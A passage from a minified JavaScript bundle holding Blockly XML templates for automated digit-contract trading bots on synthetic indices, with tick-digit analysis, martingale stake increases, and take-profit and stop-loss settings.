<block type="logic_compare" id="J%ddIHb)=I-TK|Sh!0m5">\n                                <field name="OP">LT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="Mnd!`VtpYWWTyGQ/Ln4Q">\n                                    <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="xP:|X^Iyz=23f|,p!OT5">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="4rv~sV-aHjztXMjoEE^Q">\n                                <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="efYt//0}X;(,x:NR](*B">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="controls_if" id="fEu5CRw~xV5XY~ZPY6^g">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="7N2#NJB0lz;$BIBSY#7:">\n                    <field name="OP">GT</field>\n                    <value name="A">\n                      <block type="variables_get" id="Ru9Qzl:Aj3:mEyS[xFFh">\n                        <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="{~q2nK%||rPAI=dKBC6u">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="variables_set" id="``9Ns8YsZLkiMUlVV[f?">\n                    <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                    <value name="VALUE">\n                      <block type="text" id="/U]vn-l$[/eR^sx2f@H5">\n                        <field name="TEXT">duke</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="5/jGQV7l?U^^ZK#Gl~jH">\n                        <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                        <value name="DELTA">\n                          <shadow type="math_number" id="H:-3cL?I-*LgT*^_=0cF">\n                            <field name="NUM">1</field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="poO+9^__{8%X[FxTy[Q)">\n                            <value name="IF0">\n                              <block type="logic_compare" id="yx3cUC728v|o(o*8tiM*">\n                                <field name="OP">EQ</field>\n                                <value name="A">\n                                  <block type="variables_get" id="U;a?%DCjzJNaT!W%_k;p">\n                                    <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="F!|~%qyh$eUvJ~Ck8DN7">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="sJn7HO6,bB6MF!/^y8~[">\n                                <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="GC@fih|#VBqf!uGNE%$m">\n                                    <field name="VAR" id="OPb$Wwph1|)^r0#|^^y}" variabletype="">Prediction after loss</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="I2/{Y9F%^SE^zVF)-jL`">\n                                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                                    <value name="VALUE">\n                                      <block type="math_arithmetic" id="vmwp:KfA,IW}yAO3,.F~">\n                                        <field name="OP">DIVIDE</field>\n                                        <value name="A">\n                                          <shadow type="math_number" id="K/FHvn1QO4e4z4v:OzHy">\n                                            <field name="NUM">1</field>\n                                          </shadow>\n                                          <block type="math_arithmetic" id="C2ia/?FqFCO|r@9|cl,;">\n                                            <field name="OP">MULTIPLY</field>\n                                            <value name="A">\n                                              <shadow type="math_number" id="(_{`7M`XGN8N[M_7O!N,">\n                                                <field name="NUM">1</field>\n                                              </shadow>\n                                              <block type="variables_get" id="?VzvCm3c1bSI8%=cEw|u">\n                                                <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                              </block>\n                                            </value>\n                                            <value name="B">\n                                              <shadow type="math_number" id="%^OafCLE@JX!L;@i/#n,">\n                                                <field name="NUM">1</field>\n                                              </shadow>\n                                              <block type="math_arithmetic" id="R6m56UI(u~~z]dH/:CG`">\n                                                <field name="OP">DIVIDE</field>\n                                                <value name="A">\n                                                  <shadow type="math_number" id="a2wvoTV=+sFF]BZ0cL?,">\n                                                    <field name="NUM">100</field>\n                                                  </shadow>\n                                                </value>\n                                                <value name="B">\n                                                  <shadow type="math_number" id="^?b7^);In|`Ec::.uyh5">\n                                                    <field name="NUM">24</field>\n                                                  </shadow>\n                                                  <block type="variables_get" id="]2D;spPi[pG/x~r_{wpU">\n                                                    <field name="VAR" id="VK7:nSRSXJ=|#p(oAU9v" variabletype="">Payout %</field>\n                                                  </block>\n                                                </value>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </value>\n                                        <value name="B">\n                                          <shadow type="math_number" id="cFb#@DcZ:{~P+Fp#{adm">\n                                            <field name="NUM">1</field>\n                                          </shadow>\n                                          <block type="variables_get" id="l3s.,44;O?Y?6Y9Wn.J[">\n                                            <field name="VAR" id="!mQjsA[]viO$7Gu~UzUn" variabletype="">Martingale Split</field>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="variables_set" id=":GL+TqjAhT}R9`R7a)r-">\n                    <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="?F8*!~Iw*,Cl2E%-xZ?f">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="d`pWAxZ)-H`DyzU@)We:">\n                        <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                        <value name="VALUE">\n                          <block type="text" id=",VaK^!c3pIK`a3k:8*UG">\n                            <field name="TEXT">gk</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="lZN2-r.!$w$!$0jIytwR">\n                            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                            <value name="VALUE">\n                              <block type="variables_get" id="oPs59-gAp.s,G2l8JwZF">\n                                <field name="VAR" id="~ZEk9Zr7t[g;-`afIGOO" variabletype="">Initial Stake</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="tmEYS!$HHZK`jx;}?@@$">\n                                <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="HmhEF.Mk,SNCZfE_et#K">\n                                    <field name="VAR" id="sF6($OTq!BVWswgj}4|S" variabletype="">Prediction before loss</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <next>\n                  <block type="controls_if" id="J+v4dmlVZEBry+%nA/?@">\n                    <value name="IF0">\n                      <block type="logic_compare" id="Q$x}DoiS]BBd,.}1#?D{">\n                        <field name="OP">LT</field>\n                        <value name="A">\n                          <block type="variables_get" id="jyfJ,z=)uq(o$?aOvJy/">\n                            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="math_number" id="Akj}7JIvuT)!kwrNj-JD">\n                            <field name="NUM">0.35</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="|dkn|CT8tQLSHu4NmLyy">\n                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="s(vOxwBuk{KQ7Pqc_Z3)">\n                            <field name="NUM">0.35</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                    <next>\n                      <block type="trade_again" id="C+Xpw8f|N)y`_}N2BA6p"></block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="MEfW!,-IYA)Nw|N9:]Q]" deletable="false" x="0" y="1140">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="R0vsH,PsJ=PiWfihffVt">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="^HM6~adG*H,NCT{Wbjh:">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="H7PW59RD?,Kp?xpJN!c.">\n                <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="text" id="bl*30(v6`wbHz=v;rA!n">\n                <field name="TEXT">analysis</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id=")l1fu6j4Picu4#dk`oYK">\n            <value name="IF0">\n              <block type="logic_compare" id="YDm+8EqUYBhaq.NKEp(~">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="h+w4=F)E*A#TqpF:{tjr">\n                    <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="variables_get" id=".b/[NSo_Mz(b6aE81#V)">\n                    <field name="VAR" id="x`Ia+qCu@StiaJI^X([4" variabletype="">Entrypoint-Digit</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="apollo_purchase" id=":Nx^]Pu__xj[_w$h8*VZ">\n                <field name="PURCHASE_LIST">DIGITUNDER</field>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="xXd9JKFx4pk]?ruXi_)Q">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="?W~D%e;EO6*1n?vUBo[K">\n                <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="text" id="S+;:1.@y=QJ|.W}#68lZ">\n                <field name="TEXT">gk</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="apollo_purchase" id="zOCam5W}Z-j~)}t9XOPF">\n            <field name="PURCHASE_LIST">DIGITUNDER</field>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="=#FQ-DvRG:x+k:/=:zpM">\n            <value name="IF0">\n              <block type="logic_compare" id=",I!4r$s27MG}~,]ac,}h">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="_P#Y0$pohq8}Ts^*+c:p">\n                    <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="text" id="}_#oKJ4,?b`kFm]uz;w5">\n                    <field name="TEXT">duke</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="apollo_purchase" id="BvzdHe]!O+GD=E;c7NS6">\n                <field name="PURCHASE_LIST">DIGITUNDER</field>\n              </block>\n            </statement>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="tick_analysis" id="@BqMT#eB?~r!*!lw$Cte" x="0" y="2196">\n    <statement name="TICKANALYSIS_STACK">\n      <block type="variables_set" id="@%.cH#mIqC)Wl4$9ol(m">\n        <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n        <value name="VALUE">\n          <block type="lists_getIndex" id="HA?F321LSW(X6htiNCx{">\n            <mutation statement="false" at="true"></mutation>\n            <field name="MODE">GET</field>\n            <field name="WHERE">FROM_END</field>\n            <value name="VALUE">\n              <block type="lastDigitList" id="gX804KiYdl6~UquqaPP)"></block>\n            </value>\n            <value name="AT">\n              <block type="math_number" id="=edszCSX?p`sSO0OlO0(">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <next>\n          <block type="text_join" id="^Dv$/2iLZKC-*:6HiUe4">\n            <field name="VARIABLE" id="icmJXVK=|*WSXkYEU*E;" variabletype="">text</field>\n            <statement name="STACK">\n              <block type="text_statement" id="qf8!h_@O%DMKb}A(-@cS">\n                <value name="TEXT">\n                  <shadow type="text" id="JXbo}srO/#6=a:~=562H">\n                    <field name="TEXT"></field>\n                  </shadow>\n                  <block type="text" id="09l.;el1t%J@/b0N$pe5">\n                    <field name="TEXT"> Last Appearing Digit&gt;  | </field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="Id5enOrAiqU__!JA%6iF">\n                    <value name="TEXT">\n                      <shadow type="text" id="q/GQjv(vG!#x!_~Bcjx%">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="variables_get" id="+ww=_m@`3vY^xU1lioSe">\n                        <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="btnotify" id="-vWoy~3on],v93{R[JCn">\n                <field name="NOTIFICATION_TYPE">warn</field>\n                <field name="NOTIFICATION_SOUND">silent</field>\n                <value name="MESSAGE">\n                  <shadow type="text" id=".B/0!)rDyyGk!g~rEKMu">\n                    <field name="TEXT">MrDuke</field>\n                  </shadow>\n                  <block type="variables_get" id="(VZ#B0*xwXMs_K/h]cMZ">\n                    <field name="VAR" id="icmJXVK=|*WSXkYEU*E;" variabletype="">text</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            56505: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" collection="false" is_dbot="true">\n  <variables></variables>\n  <block type="trade_definition" x="0" y="0">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" deletable="false" movable="false">\n        <field name="MARKET_LIST"></field>\n        <field name="SUBMARKET_LIST"></field>\n        <field name="SYMBOL_LIST"></field>\n        <next>\n          <block type="trade_definition_tradetype" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST"></field>\n            <field name="TRADETYPE_LIST"></field>\n            <next>\n              <block type="trade_definition_contracttype" deletable="false" movable="false">\n                <field name="TYPE_LIST"></field>\n                <next>\n                  <block type="trade_definition_candleinterval" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="false"></mutation>\n        <field name="DURATIONTYPE_LIST"></field>\n        <field name="CURRENCY_LIST">USD</field>\n        <value name="DURATION">\n          <shadow type="math_number_positive">\n            <field name="NUM">5</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number_positive">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <field name="AMOUNT_LIMITS"></field>\n      </block>\n    </statement>\n  </block>\n  <block type="during_purchase" x="720" y="0">\n    <statement name="DURING_PURCHASE_STACK">\n      <block type="controls_if">\n        <value name="IF0">\n          <block type="check_sell"></block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" x="720" y="248">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="trade_again"></block>\n    </statement>\n  </block>\n  <block type="before_purchase" x="0" y="576">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="apollo_purchase">\n        <field name="PURCHASE_LIST"></field>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            60379: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="]5iLl6(7ZfUYNLLS6q.3" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="bl9gNIKkN@m|.7=Z9Dc%" islocal="false" iscloud="false">Stake</variable>\n  </variables>\n  <block type="trade_definition" id="L@Q#-]N+XBeV+*Pk~nE2" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id=")7mn7E%5t*N8t[b1%GvP" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="2}wcc?[fgv!x#kkTl$6o" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">matchesdiffers</field>\n            <next>\n              <block type="trade_definition_contracttype" id="w,IubS0Y)aPaw[/(J,Tb" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="Fv-$jpkN,djvJm5ThYGQ" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="PClzs|t]C^18l@B^Htj(" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">TRUE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="1ily$%Z!O$N;B.c]{4:c" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="SX9]6GL^muUpbL@PA?;n">\n        <field name="VAR" id="bl9gNIKkN@m|.7=Z9Dc%" variabletype="">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id="O1fKsVZYzDWY]LZY?_f/">\n            <field name="NUM">5</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id=";VgXEDj8A5p%d}SOq[a1">\n            <field name="VAR" id="]5iLl6(7ZfUYNLLS6q.3" variabletype="">Prediction</field>\n            <value name="VALUE">\n              <block type="math_number" id="f}o8slnt#/yU=wOqSh^c">\n                <field name="NUM">0</field>\n              </block>\n            </value>\n            <next>\n              <block type="text_print" id="di/h:4ga0*X*3oALB~%?">\n                <value name="TEXT">\n                  <shadow type="text" id="qlq6zG)C}N3NcE$~x9aP">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="text" id="^P9t~U_p89S%0~|l{=ff">\n                    <field name="TEXT">Trade Random Digits from 0-9. Only 1 run per Prediction.Keep on increasing stake by  compounding your profit to Hit Take Profit First..................................All the Best!!!</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="BlJYBZ)-T^2,JH5+%6(N">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number_positive" id="hH#~3.CCIij1UXG1F{VH">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="math_number" id="BBZ$L$2s^?~mx%ZdjZ)@">\n            <field name="NUM">1</field>\n          </block>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number_positive" id="zu(gUc|tiFy8i7RRa3fm">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="t}jTkKZ~3l^tB^a6K2lX">\n            <field name="VAR" id="bl9gNIKkN@m|.7=Z9Dc%" variabletype="">Stake</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="*J1)jP~r7Fl}C(.MJ[_#">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="8-se8-EW~+S%kxgfpBrv">\n            <field name="VAR" id="]5iLl6(7ZfUYNLLS6q.3" variabletype="">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="qWVM-_};!KzsS]~n4Lda" x="981" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="JVjwuJXsV]5b6%eM._s5">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="contract_check_result" id="i(@bcfWN4d^@Lwcg+}%V">\n            <field name="CHECK_RESULT">win</field>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="set_tp" id="2J2(big8,Y9_(=yW4$Wr"></block>\n        </statement>\n        <statement name="ELSE">\n          <block type="set_sl" id="wDJ^U;^v!.9#;y:08*bG"></block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id=")Tv/V-InpSs8@g4hz)K)" deletable="false" x="0" y="708">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="apollo_purchase" id="oc1zyNJ#O%B:1^m/}A2y">\n        <field name="PURCHASE_LIST">DIGITDIFF</field>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            65765: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="VLBj7P@:FqNy~,R[c9Hp" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="}4sS3G-ig-*lgLxN.HK~" islocal="false" iscloud="false">Entry Point</variable>\n    <variable type="" id="r3#,*L{|k_*_oikco?~E" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="Qq28jzu{61V^?3_DKY1z" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="!(67Y!ov*~[U/$pjZ,0." islocal="false" iscloud="false">Stake win</variable>\n    <variable type="" id="x4khAyN_n|huu=qVhBFG" islocal="false" iscloud="false">item</variable>\n    <variable type="" id="Z@.ow_sBjxwtbL$F52.u" islocal="false" iscloud="false">Martingale</variable>\n    <variable type="" id="_$b#PTe$SH2iW}Unna2W" islocal="false" iscloud="false">Use Martingale</variable>\n    <variable type="" id="iexW!(p-QSL[kDvWK`o-" islocal="false" iscloud="false">Take Profit</variable>\n    <variable type="" id="AwGIX3K`=6@AOl/-`G)O" islocal="false" iscloud="false">Stop Loss</variable>\n    <variable type="" id="tpKgmnH0mz*.t/T=*i|V" islocal="false" iscloud="false">Maximum Runs</variable>\n    <variable type="" id="XfX?ed24Y,S7*f=/-sQ9" islocal="false" iscloud="false">Use Compounding Stake</variable>\n    <variable type="" id="@VN/)JBDaz5d-aHKEiy:" islocal="false" iscloud="false">Switch Markets</variable>\n    <variable type="" id="Vd)a}rnFL$Mr`V[FG0ZX" islocal="false" iscloud="false">Count</variable>\n    <variable type="" id=":,%~KY@s+t4t[x%D|Rs`" islocal="false" iscloud="false">Set Maximum Runs</variable>\n  </variables>\n  <block type="trade_definition" id="Dn+|l@F{1c%e:[S_b*y+" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="?%-k%1.^XwP?^NTZ,Yt%" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">1HZ10V</field>\n        <next>\n          <block type="trade_definition_tradetype" id="Ny,T+]j~q=euwb2^Hkrt" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">evenodd</field>\n            <next>\n              <block type="trade_definition_contracttype" id="9KwoosLzczeC~F:5~JTl" deletable="false" movable="false">\n                <field name="TYPE_LIST">DIGITEVEN</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="YCRtYsVDuvI2m(|Sn=oN" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="5Nn9BCfR{SxZMWof=~U6" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="$w}(v#RJo+GTV~6N#rJ(" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="VtinTUlRho|l^-0R$7%A">\n        <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id="eE1:{)l/a]lYGgEq(xNf">\n            <field name="NUM">0.5</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="yuTs63H@^mt2$7WA8MM#">\n            <field name="VAR" id="iexW!(p-QSL[kDvWK`o-" variabletype="">Take Profit</field>\n            <value name="VALUE">\n              <block type="math_number" id="Ze7;s[0;Nz2%O4S_83gA">\n                <field name="NUM">5</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="nGr}CP0n6hP98*@D%p1~">\n                <field name="VAR" id="AwGIX3K`=6@AOl/-`G)O" variabletype="">Stop Loss</field>\n                <value name="VALUE">\n                  <block type="math_number" id="CNwP055C@dZ]pl;V~^@e">\n                    <field name="NUM">30</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="OsGf7Gg0%Bcr(O%2{xCZ">\n                    <field name="VAR" id="Z@.ow_sBjxwtbL$F52.u" variabletype="">Martingale</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="A:w{a,.n|YO,bwZCpH[w">\n                        <field name="NUM">2</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="l!28PD.;#a94j}-Zny(w">\n                        <field name="VAR" id="_$b#PTe$SH2iW}Unna2W" variabletype="">Use Martingale</field>\n                        <value name="VALUE">\n                          <block type="logic_boolean" id="yGRw;hhT=8$k[bq6[a5v">\n                            <field name="BOOL">TRUE</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="if+z)P.pg^EiMjJbZURL">\n                            <field name="VAR" id="XfX?ed24Y,S7*f=/-sQ9" variabletype="">Use Compounding Stake</field>\n                            <value name="VALUE">\n                              <block type="logic_boolean" id="#q7dU*x-S3?p7GPK0lX)">\n                                <field name="BOOL">FALSE</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="I-tw}E3wa6t2?-7un5%W">\n                                <field name="VAR" id="@VN/)JBDaz5d-aHKEiy:" variabletype="">Switch Markets</field>\n                                <value name="VALUE">\n                                  <block type="logic_boolean" id="nEAPjl%ws7=.-TTk$d5j">\n                                    <field name="BOOL">FALSE</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="Eu_!a.GW35dfWcQJT{Vo">\n                                    <field name="VAR" id=":,%~KY@s+t4t[x%D|Rs`" variabletype="">Set Maximum Runs</field>\n                                    <value name="VALUE">\n                                      <block type="logic_boolean" id="/bG]-A`uutQSD($fK!W*">\n                                        <field name="BOOL">FALSE</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="procedures_callnoreturn" id="n5,AF[HWnBb[AxF:2sMU">\n                                        <mutation name="Prevent Over Trading"></mutation>\n                                        <data>:Tq]VUlM=BJk#=;.3aYU</data>\n                                        <next>\n                                          <block type="variables_set" id="04?NsjPy@EcVaNBFvS~q" collapsed="true">\n                                            <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                                            <value name="VALUE">\n                                              <block type="variables_get" id="x|YP+!A%~5?j+94P(AuL">\n                                                <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="variables_set" id=",N%:N5HXk:D9]dYCQJ-N" collapsed="true">\n                                                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                                                <value name="VALUE">\n                                                  <block type="math_number" id="%dG/.3}`9pxjxDYvt3t$">\n                                                    <field name="NUM">0</field>\n                                                  </block>\n                                                </value>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="WeNX1fen.XO?FdRLm_m^">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="false"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number_positive" id="},}3yJ69-J-gHxwa*8N:">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number_positive" 